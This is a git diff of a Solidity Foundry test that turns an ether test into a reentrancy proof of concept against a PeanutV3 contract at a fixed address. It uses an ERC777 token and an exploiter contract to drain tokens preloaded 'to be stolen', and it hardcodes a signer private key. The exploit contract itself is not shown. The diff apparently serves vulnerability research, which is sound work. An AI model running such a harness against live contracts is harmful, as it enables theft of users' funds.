@@ -5,40 +5,56 @@ import "forge-std/Test.sol";
 import "../src/PeanutV3.sol";
 
 import "../src/ECDSA.sol";
-import "../src/Exploiter.sol";
+// import "../src/ExploiterEther.sol";
+import "../src/ExploiterERC777.sol";
 
-contract NutcrackerTest is Test {
+import "../src/Token.sol";
+
+import {IERC1820Registry} from  "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
+
+contract DummyERC777TokensRecipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
+        // Do nothing
+    }
+}
+
+contract NutcrackerTest is Test, DummyERC777TokensRecipient {
     PeanutV3 peanutV3;
+
+    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
 
     uint256 SIGNER_PRIVATE_KEY = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
     address SIGNER_ADDRESS = 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720;
-    bytes SIGNATURE = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");
+
+    Token public token;
+    uint256 public totalTokens = 10;
 
     function setUp() public {
         peanutV3 = PeanutV3(0xdB60C736A30C41D9df0081057Eae73C3eb119895);
+
+        // Ability to receive ERC777 tokens
+        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
+
+        address[] memory defaultOperators = new address[](1);
+        defaultOperators[0] = address(this);
+        token = new Token("Token", "TKN", defaultOperators, totalTokens);
     }
 
-    function testWithdrawDeposit() public {
-        bytes memory signature = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");
-
-
-        peanutV3.withdrawDeposit(
-            78, 
-            address(0xAb45507d1db315e8618eA26D78F1C85210077792), 
-            bytes32(0x677790e30694f0593afa76b03652171614f27e222783ea585f0742634eb992fb), 
-            signature
-        );
-    }
-
-    function testMakeDeposit() public {
-        address _tokenAddress = address(0); // ETH
-        uint8 _contractType = 0; // ether
-        uint256 _amount = 1 ether;
+    function testReentrancy() public {
+        uint8 _contractType = 1; // ERC20
+        uint256 _amount = 1;
         uint256 _tokenId = 0; // ignored when _contractType == 0
         address _pubKey20 = SIGNER_ADDRESS;
 
         // Setup Exploiter
-        Exploiter exploiter = new Exploiter(peanutV3);
+        ExploiterERC777 exploiter = new ExploiterERC777(peanutV3);
         address hacker = address(exploiter);
 
         // Signature
@@ -47,21 +63,31 @@ contract NutcrackerTest is Test {
         bytes memory signature = abi.encodePacked(r, s, v);
         emit log_bytes(signature);        
 
-        // Preload PeanutV3 with ether
-        vm.deal(address(peanutV3), 2 ether);
+        // Preload PeanutV3 with assets
+        // These assets are the one being stolen by the hacker
+        token.transfer(address(peanutV3), totalTokens - 1);
 
-        // Deposit 1 ether
-        uint256 depositId = peanutV3.makeDeposit{value: _amount}(
-            _tokenAddress,
+        // Deposit assets
+        token.approve(address(peanutV3), _amount);
+        uint256 depositId = peanutV3.makeDeposit(
+            address(token),
             _contractType,
             _amount,
             _tokenId,
             SIGNER_ADDRESS
         );
 
-        emit log_named_uint("depositId", depositId);
-        uint256 initialBalance = address(hacker).balance;
-        emit log_named_uint("Balance before ", initialBalance);
+        emit log_named_uint("Deposit id", depositId);
+        uint256 initialBalance = token.balanceOf(hacker);
+        emit log_named_uint("Hacker balance before exploit", initialBalance);
+
+        // Set exploit parameters
+        exploiter.setParams(
+            depositId,
+            ECDSA.toEthSignedMessageHash(abi.encodePacked(keccak256(abi.encodePacked(hacker)))),
+            signature,
+            totalTokens - 1
+        );
 
         // Withdraw
         peanutV3.withdrawDeposit(
@@ -71,7 +97,8 @@ contract NutcrackerTest is Test {
             signature
         );
 
-        emit log_named_uint("Balance after ", address(hacker).balance);
-        emit log_named_uint("Withdrew ", address(hacker).balance - initialBalance);
+        emit log_named_uint("Hacker balance after exploit", token.balanceOf(hacker));
+        emit log_named_uint("Hacker withdrew", token.balanceOf(hacker) - initialBalance);
+        emit log_named_uint("Hacker reenter count", exploiter.reentrancyCount());
     }
 }
